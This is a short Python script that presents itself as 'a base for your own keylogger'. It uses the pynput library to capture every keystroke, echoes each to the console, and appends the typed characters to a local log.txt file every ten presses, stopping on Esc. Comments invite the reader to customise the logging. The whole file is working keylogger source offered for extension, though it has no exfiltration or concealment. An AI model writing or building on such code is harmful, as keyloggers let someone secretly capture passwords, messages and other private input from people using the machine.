# this is only a base for your own keylogger

from pynput.keyboard import Key, Listener
count = 0
keys = []


# main function
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10: # you can put the count you want
        count = 0
        write_file(keys)
        keys = []


# check pynput docs to create your own custom write system
def write_file(keys):
    # create "log.txt" file before running
    with open("log.txt", "a") as f:
        # here you can put your definitions on how to write the log
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("enter") > 0:
                f.write("\n\n")
            elif k.find("Key") == -1:
                f.write(k)


# quit the system
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
